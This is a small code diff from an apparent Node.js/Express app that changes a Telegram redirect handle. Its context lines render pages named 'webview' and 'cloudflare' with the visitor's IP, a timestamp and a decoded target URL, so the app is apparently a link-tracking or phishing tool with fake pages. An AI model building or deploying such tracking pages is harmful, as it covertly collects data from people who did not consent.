@@ -30,7 +30,7 @@ if(req.params.path != null){
 res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
 } 
 else{
-res.redirect("https://t.me/th30neand0nly0ne");
+res.redirect("https://t.me/WWEEHHHH");
 }
 
          
@@ -48,7 +48,7 @@ if(req.params.path != null){
 res.render("cloudflare",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
 } 
 else{
-res.redirect("https://t.me/th30neand0nly0ne");
+res.redirect("https://t.me/WWEEHHHH");
 }
 
          
